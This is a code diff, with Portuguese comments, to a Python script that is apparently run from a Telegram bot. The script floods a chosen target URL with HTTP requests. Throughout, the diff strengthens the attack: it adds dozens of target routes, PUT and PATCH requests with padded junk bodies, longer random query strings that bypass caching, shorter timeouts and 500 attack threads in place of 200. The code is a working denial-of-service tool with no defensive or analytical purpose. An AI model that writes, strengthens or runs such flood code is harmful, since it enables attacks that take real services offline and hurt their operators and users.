@@ -13,7 +13,7 @@ threads = []
 lock = threading.Lock()
 contador = 0
 
-rotas = ["/", "/login", "/admin", "/search", "/panel", "/api", "/dashboard"]
+rotas = ["/", "/login", "/admin", "/search", "/panel", "/api", "/dashboard", "/wp-admin", "/phpmyadmin", "/cpanel", "/config", "/backup", "/db", "/mysql", "/sql", "/users", "/upload", "/download", "/files", "/media", "/images", "/css", "/js", "/assets", "/public", "/private", "/secure", "/protected", "/system", "/core", "/lib", "/includes", "/modules", "/plugins", "/themes", "/templates", "/cache", "/tmp", "/logs", "/error", "/debug", "/test", "/dev", "/staging", "/beta"]
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -32,16 +32,21 @@ def gerar_headers():
 def disparar_requisicoes():
     global contador
     while ataque_ativo:
-        for _ in range(10):
+        for _ in range(25):
             try:
                 rota = random.choice(rotas)
-                url = alvo + rota + "?q=" + ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
+                url = alvo + rota + "?q=" + ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(12))
                 headers = gerar_headers()
-                requests.get(url, headers=headers, timeout=1)
-                requests.post(url, headers=headers, data={"x": "A" * 500}, timeout=1)
-                requests.head(url, headers=headers, timeout=1)
+                
+                # Múltiplas requisições simultâneas
+                requests.get(url, headers=headers, timeout=0.5)
+                requests.post(url, headers=headers, data={"x": "A" * 1000, "y": "B" * 800, "z": "C" * 600}, timeout=0.5)
+                requests.head(url, headers=headers, timeout=0.5)
+                requests.put(url, headers=headers, data={"data": "X" * 1200}, timeout=0.5)
+                requests.patch(url, headers=headers, data={"patch": "Y" * 900}, timeout=0.5)
+                
                 with lock:
-                    contador += 3
+                    contador += 5
                     print(f"Enviando req para {alvo}", end="\r")
             except Exception as e:
                 print(f"Erro na requisição: {e}")
@@ -80,7 +85,7 @@ async def receber_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contador = 0
     threads = []
 
-    for _ in range(200):
+    for _ in range(500):
         t = threading.Thread(target=disparar_requisicoes)
         t.daemon = True
         t.start()
